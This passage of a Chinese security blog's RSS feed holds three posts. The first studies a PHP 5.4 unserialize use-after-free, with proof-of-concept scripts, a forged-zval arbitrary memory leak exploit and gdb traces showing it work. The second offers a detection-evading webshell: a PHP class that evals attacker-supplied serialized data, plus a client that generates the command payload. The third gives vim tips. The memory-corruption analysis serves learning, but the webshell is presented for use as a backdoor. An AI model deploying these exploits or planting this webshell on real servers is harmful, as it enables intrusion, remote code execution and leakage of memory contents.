        些zval的颜色变成黑色(zval的默认颜色属性)

        D:遍历zval节点,将C中标记成白色的节点zval释放掉.

        &amp;lt;?php
        $a = array('one');
        $a[] = &amp;amp;$a;
        unset($a);
        ?&amp;gt;
        比如上面这个变成垃圾的数组$a对应的zval,命名为zval_a,  如果没有执行unset, zval_a的refcount为2,分别由$a
        和$a中的索引1指向这个zval.  用算法对这个数组中的所有元素(索引0和索引1)的zval的refcount进行减1操作,由于索
        引1对应的就是zval_a,所以这个时候zval_a的refcount应该变成了1,这样zval_a就不是一个垃圾.如果执行了unset操作,
        zval_a的refcount就是1,由zval_a中的索引1指向zval_a,用算法对数组中的所有元素(索引0和索引1)的zval的refcount进
        行减1操作,这样zval_a的refcount就会变成0,于是就发现zval_a是一个垃圾了. 算法就这样发现了顽固的垃圾数据.
        举了这个例子,读者大概应该能够知道其中的端倪:
        对于一个包含环形引用的数组,对数组中包含的每个元素的zval进行减1操作,之后如果发现数组自身的zval的refcount变
        成了0,那么可以判断这个数组是一个垃圾.这个道理其实很简单,假设数组a的refcount等于m, a中有n个元素又指向a,如
        果m等于n,那么算法的结果是m减n,m-n=0,那么a就是垃圾,如果m&amp;gt;n,那么算法的结果m-n&amp;gt;0,所以a就不是垃圾了m=n代表什么?
        代表a的refcount都来自数组a自身包含的zval元素,代表a之外没有任何变量指向它,代表用户代码空间中无法再访问到a所
        对应的zval,代表a是泄漏的内存,因此GC将a这个垃圾回收了.

        更多理解可参考笔者另一篇专门讲解对gc_collect_cycle()的流程的理解的文章:
        http://3xp10it.cc/web/2017/05/12/php对可能是垃圾的zval的回收过程的理解/


        [http://www.freebuf.com/vuls/122938.html]
        漏洞环境一般不会手工调用gc_collect_cycles(),所以就需要在单一unserialize()调用的情况下完成垃圾回收.
        在PHP中默认的gc_root_buffer缓冲区大小是100000个(可存放100000个gc_root_buffer),所以只要构造一个超过这个
        数量元素的数组就可以自动触发gc_collect_cycles().
        #define GC_ROOT_BUFFER_MAX_ENTRIES 10000
        下面代码可以自动触发垃圾回收,无需手工调用gc_collect_cycles()
        define(&quot;GC_ROOT_BUFFER_MAX_ENTRIES&quot;, 10000);
        define(&quot;NUM_TRIGGER_GC_ELEMENTS&quot;, GC_ROOT_BUFFER_MAX_ENTRIES+5);
        $overflow_gc_buffer = str_repeat('i:0;a:0:{}', NUM_TRIGGER_GC_ELEMENTS);
        $trigger_gc_serialized_string = 'a:'.(NUM_TRIGGER_GC_ELEMENTS).':{'.$overflow_gc_buffer.'}';
        unserialize($trigger_gc_serialized_string);

        垃圾分析算法是当发现缓冲区满的时候就立即触发,垃圾分析跟代码执行流是同步过程,也就是只有垃圾分析结束之后,代
        码才会继续执行.所以在我们的PHP代码中,如果某个unset正好使GC的节点缓冲区满,触发了垃圾分析流程,那么这个unset
        耗费的时间将比一般的unset多很多.

        个人理解:
        一般来说,unserialize执行之后系统发现新出现的zval(unserialize产生的zval)可能是垃圾,于是将新出现的zval的信息
        存入到一个新的gc_root_buffer,这时如果恰好gc_root_buffer的个数超过100000,将触发垃圾分析流程

        !!!然而本文当中并没有利用到unserialize的关于上面的100000大小相关的自动调用gc_collect_cycles()的特点,本
        文中的unserialize之所以能触发漏洞是因为unserialize后有个重新赋值给[&quot;aaa&quot;]的动作,而这个动作相当于
        unset([&quot;aaa&quot;]),这样会使得[&quot;aaa&quot;]所在的zval的refcount=0而导致[&quot;aaa&quot;]所在内存被释放.本文中并不是因为发生
        了gc_root_buffer的个数超过100000而自动的运行gc_collect_cycles()而产生的uaf的漏洞.也即本文与php5.3之后的
        新的垃圾回收机制无关.

    2.利用zval结构为何可泄露任意内存?
        nsfocus:(http://blog.nsfocus.net/tech/技术分享/2016/08/08/PHP-unserialize.html)
        同一个 zval 结构容器,当一个普通 int 类型的 zval 被解释成了 string 类型的 zval 后,这个 zval 的前四个字
        节会被当成字符指针,而紧接着的四个字节,将会被当成是字符串的长度. 这时如果有一个 Use After Free 的漏洞
        配合,使用一个 string 类型的 zval 去覆盖一个 int 类型的 zval, 然后使用一个引用去引用之前的zval以重用,这
        时再使用 var_dump 等方式重新查看这个 zval 时,就会输出那个指针所指向的内存的内容,从而达到了任意地址信息
        泄露的效果(这里笔者认为这里说错了,应该这样说:使用一个int类型的zval去覆盖一个string类型的zval,然后使用一个
        引用去引用之前的zval以重用)

d)更多关于PHP内存破坏的学习
    [php7中的unserialize漏洞利用]
    https://blog.checkpoint.com/wp-content/uploads/2016/08/Exploiting-PHP-7-unserialize-Report-160829.pdf
    [fuzz unserialize]
    https://www.evonide.com/fuzzing-unserialize/
    [一个很详细的关于php垃圾回收与uaf的漏洞分析]
    http://www.freebuf.com/vuls/122938.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;h4 id=&quot;a调试环境&quot;&gt;a)调试环境&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali2 x86 
php5.4.34
gdb
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;b环境配置&quot;&gt;b)环境配置&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.下载php5.4.34到/root/php5.4.34    
    php5.4.34根目录下的.gdbinit是php为了方便被gdb调试,需要在gdb php之后source path/.gdbinit
        link:https://phpor.net/blog/post/997
        print_cvs:打印当前执行环境中已编译的PHP变量
        printzv 0x....:打印指定的PHP变量,需要指定地址
        zbacktrace:打印PHP函数调用栈
        print_ft:打印函数表 
        更多用法参考上面的链接

2.编译php到指定目录
    kali2.0下:
    mkdir /usr/bin/ndphp
    ./configure --prefix=/usr/bin/ndphp
        如果报xml2-config错误则apt-get install libxml2-dev可解决
    make
    make install

3.vi /root/StefanEsser_Original_POC.php
    -----------start------------
    &amp;lt;?php
    for ($i=4; $i&amp;lt;100; $i++) {
      var_dump($i);

      $m = new StdClass(); 
      $u = array(1); 
      $m-&amp;gt;aaa = array(1,2,&amp;amp;$u,4,5);

      $m-&amp;gt;bbb = 1;
      $m-&amp;gt;ccc = &amp;amp;$u;
      $m-&amp;gt;ddd = str_repeat(&quot;A&quot;, $i); 
      $z = serialize($m);
      $z = str_replace(&quot;bbb&quot;, &quot;aaa&quot;, $z);

      var_dump($z);

      $y = unserialize($z);

      var_dump($y);
    }
    ?&amp;gt;
    -----------end------------

4.vi /root/StefanEsser_Original_LocalMemLeak.php
    -----------start------------
    &amp;lt;?php
    $data ='O:8:&quot;stdClass&quot;:3:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;s:39:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;}';
    $x = unserialize($data);
    var_dump($x);
    ?&amp;gt;
    -----------end------------
5.vi /root/PHPLeak.php
    -----------start------------
    &amp;lt;?php
    $fakezval = pack(
        'IIII',     //unsigned int
        0x08048000, //address to leak
        0x0000000f, //length of string
        0x00000000, //refcount
        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
    );
    //obj from original POC by @ion1c
    $obj = 'O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}';
    $obj=unserialize($obj);

    for($i = 0; $i &amp;lt; 5; $i++) { //this i value is larger than usually required
        $v[$i]=$fakezval.$i; //repeat to overwrite
    }
    //due to the reference being overwritten by our loop above, leak memory
    echo $obj-&amp;gt;ccc;
    ?&amp;gt;
    -----------end------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;c调试&quot;&gt;c)调试&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;测试StefanEsser_Original_POC.php是否会导致php解释器出问题
    └&amp;gt; /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php 
    int(4)
    string(134) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}&quot;
    object(stdClass)#2 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(4) &quot;AAAA&quot;
    }
    int(5)
    string(135) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:5:&quot;AAAAA&quot;;}&quot;
    object(stdClass)#1 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(-1254177400)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(5) &quot;AAAAA&quot;
    }
    int(6)
    string(136) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:6:&quot;AAAAAA&quot;;}&quot;
    object(stdClass)#3 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(6) &quot;AAAAAA&quot;
    }
    int(7)
    string(137) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:7:&quot;AAAAAAA&quot;;}&quot;
    object(stdClass)#2 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(7) &quot;AAAAAAA&quot;
    }
    int(8)
    string(138) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:8:&quot;AAAAAAAA&quot;;}&quot;
    object(stdClass)#1 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(8) &quot;AAAAAAAA&quot;
    }
    int(9)
    string(139) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:9:&quot;AAAAAAAAA&quot;;}&quot;
    [1]    2141 segmentation fault  /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php

    果然出现segmentation fault

动态调试php
    └&amp;gt; gdb /usr/bin/ndphp/bin/php
    GNU gdb (Debian 7.11.1-2) 7.11.1
    Copyright (C) 2016 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
    and &quot;show warranty&quot; for details.
    This GDB was configured as &quot;x86_64-linux-gnu&quot;.
    Type &quot;show configuration&quot; for configuration details.
    For bug reporting instructions, please see:
    &amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
    Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
    For help, type &quot;help&quot;.
    Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
    Reading symbols from /usr/bin/ndphp/bin/php...done.

    [加载php根目录下的.gdbinit]
    source /root/php-5.4.34/.gdbinit

    [下断点]
    (gdb) b var_unserializer.c:337

    [运行StefanEsser_Original_LocalMemLeak.php]
    r StefanEsser_Original_LocalMemLeak.php

    [第一次命中]
    Starting program: /usr/bin/ndphp/bin/php StefanEsser_Original_LocalMemLeak.php
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=2, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
    337                             convert_to_string(key);

    [跳过第一次命中后又发生了第二次命中]
    (gdb) c
    Continuing.

    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=1, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
    337                             convert_to_string(key);

    [执行print *(var_entries*)var_hash-&amp;gt;first][乌云上的原文说的执行printzv *(var_entries)var_hash-&amp;gt;first有误]
    (gdb) print *(var_entries*)var_hash-&amp;gt;first
    $1 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &amp;lt;repeats 1016 times&amp;gt;}, used_slots = 8, next = 0x0}
    可看出data变量是个数组,数组里面的内容是地址,这些地址指向unserialize函数解析的变量值,关注第5个0xb5c6f1c0(php
    代码中用的是R:5).
    unserialize函数解析的变量值分别为下面的各个zval的内存地址:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/zval1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    上图中蓝色是符号,红色是zval的属性,绿色是zval的值
    查看这个地址中的内容:

    [printzv 0xb5c6f1c0]
    (gdb) printzv 0xb5c6f1c0
    [0xb5c6f1c0] (refcount=1) string(39): &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;

    [步过断点继续运行]
    (gdb) n
    338                             zend_hash_update(ht, Z_STRVAL_P(key), Z_STRLEN_P(key) + 1, &amp;amp;data,
    这里的zend_hash_update为可疑函数
    
    步过该可疑函数并查看刚才地址0xb5c6f1c0中出现了什么内容
    (gdb) n
    342                     zval_dtor(key);
    (gdb) printzv 0xb5c6f1c0
    [0xb5c6f1c0] (refcount=0) string(39): &quot;\35\0\0\0-\0\0\0\0\37777777761\37777777706\37777777665\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0-\0\0\0\35\0\0\0D\37777777761\37777777706&quot;
    笔者认为:
    这里步过zend_hash_update之后将导致[&quot;aaa&quot;]变量由array(5)[1,2,&quot;AAA..A&quot;,4,5]变成int(1),这样的话相当于一个
    unset([&quot;aaa&quot;])操作,[1,2,&quot;AAA..A&quot;,4,5]这个zval由于原来的[&quot;aaa&quot;]符号被unset了,导致原来的[&quot;aaa&quot;]符号对应的
    [1,2,&quot;AAA..A&quot;,4,5]这个zval的refcount变成0,使得[1,2,&quot;AAA..A&quot;,4,5]这个zval被释放,这个被释放的zval的内存的位置
    将被用来存储新的变量的内容,所以这里看到的printzv 0xb5c6f1c0的结果不再是string(39): &quot;AAAAA...A&quot;了,(暂时不理解
    为什么是上面显示的杂乱的数据)

    还要确认下该地址是不是还在var_hash表中,然后继续运行
    (gdb) print *(var_entries*)var_hash-&amp;gt;first
    $3 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &amp;lt;repeats 1016 times&amp;gt;}, used_slots = 8, next = 0x0}
    发现还在

    (gdb) c
    Continuing.

    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=0, objprops=1, rval=0xbfffbc64)
        at /root/php-5.4.34/ext/standard/var_unserializer.c:337
    337                             convert_to_string(key);
    (gdb) c
    Continuing.
    object(stdClass)#1 (2) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;string(39) &quot;--D&quot;
    }
    [Inferior 1 (process 1725) exited normally]
    这里不知为何[&quot;ccc&quot;]对应的zval的值变成--D了
    (gdb)quit

    现在尝试通过一个int类型的zval覆盖[&quot;aaa&quot;]符号对应的原来占据的array类型的zval值的空间,也即占据下面图中的
    array(5)[1,2,array(1),4,5] 这个zval所在的内存的空间
    运行/usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c

    ---------PHPLeak.php------------
    &amp;lt;?php
    $fakezval = pack(
        'IIII',     //unsigned int
        0x08048000, //address to leak
        0x0000000f, //length of string
        0x00000000, //refcount
        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
    );
    //obj from original POC by @ion1c
    $obj = 'O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}';
    $obj=unserialize($obj);

    for($i = 0; $i &amp;lt; 5; $i++) { //this i value is larger than usually required
        $v[$i]=$fakezval.$i; //repeat to overwrite
    }
    //due to the reference being overwritten by our loop above, leak memory
    echo $obj-&amp;gt;ccc;
    ?&amp;gt;
    ---------PHPLeak.php------------

    对应zval图如下:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/zval2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
    output:
    $ /usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
    0000000 177   E   L   F 001 001 001  \0  \0  \0  \0  \0  \0  \0  \0
    000000f
    [1]    2195 segmentation fault  /usr/bin/ndphp/bin/php PHPLeak.php |
           2197 done                hexdump -c
    这里说明可成功泄露指定地址指定长度的内存内容

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 19 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</guid>
        
        <category>php</category>
        
        <category>漏洞利用</category>
        
        <category>二进制</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>unserialize免杀webshell</title>
        <description>&lt;h3 id=&quot;php的unserialize函数&quot;&gt;php的unserialize函数&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php的unserialize反序列化函数可以将反序列化后的结果还原成数字,字符,数组,对象等类型,如果还原后的结果是对象且这个
对象对应的类有__wakeup,__destruct等函数,那么在unserialize函数执行后将执行对应的函数(__wakeup,__destruct等)

refer:
http://www.91ri.org/3960.html
https://www.owasp.org/index.php/PHP_Object_Injection
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;利用unserialize构造webshell&quot;&gt;利用unserialize构造webshell&lt;/h3&gt;

&lt;h4 id=&quot;服务端webshell&quot;&gt;服务端[webshell]&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

class foo{
    public $data=&quot;text&quot;;
    function __destruct()
    {
        eval($this-&amp;gt;data);
    }

}

$file_name=$_GET['id'];
unserialize($file_name);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;客户端相当于菜刀&quot;&gt;客户端[相当于菜刀]&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

class foo{
    #public $data=&quot;phpinfo();&quot;;
    public $data=&quot;system('ls');&quot;;

}
$a=new foo;
$b=serialize($a);
echo &quot;please visit uri:\n&quot;.&quot;[your shell page url]&quot;.&quot;?id=&quot;.$b;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;理解&quot;&gt;理解&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时
,服务端在反序列化这个这个传入的反序列化值后将认为这是当前内存中对应的foo类模板的一个实例对象,于是去执行当前内存
的foo类模板的__wakeup,__destruct等函数,但是恰好这些函数会造成php代码执行[eval($this-&amp;gt;data)],且$this-&amp;gt;data可控.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;本文代码对应下载链接如下&lt;br /&gt;
&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/unserializePHP&quot;&gt;download&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;more&quot;&gt;more&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来发现下面这篇文章已经总结得得好了
http://www.cnblogs.com/LittleHann/p/3522990.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 18 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/</guid>
        
        <category>unserialize</category>
        
        <category>php</category>
        
        <category>webshell</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>vim技巧</title>
        <description>&lt;p&gt;###&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.免去.vimrc中写set pastetoggle=&amp;lt;f7&amp;gt;,(:set paste或:set unpaste)粘贴原文的时候直接用&quot;+寄存器
2.复制内容时可这样:(这样可免去进入可视模式)
    1&amp;gt;在要复制的起始处ma(标记为a)
    2&amp;gt;s跳转到要复制的结尾处(已经将s设置为easymotion插件的触发键的情况下)
    3&amp;gt;在已经跳转到的结尾处y'a(表示复制到a标记处)
    4&amp;gt;s跳转到要粘贴的地方,然后p即可

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 22 Mar 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/vim/2017/03/22/vim%E6%8A%80%E5%B7%A7/</link>
        <guid isPermaLink="true">http://localhost:4000/vim/2017/03/22/vim%E6%8A%80%E5%B7%A7/</guid>
        
        <category>vim</category>
        
        <category>editor</category>
        
        
        <category>vim</category>
        
      </item>
    
  </channel>
</rss>
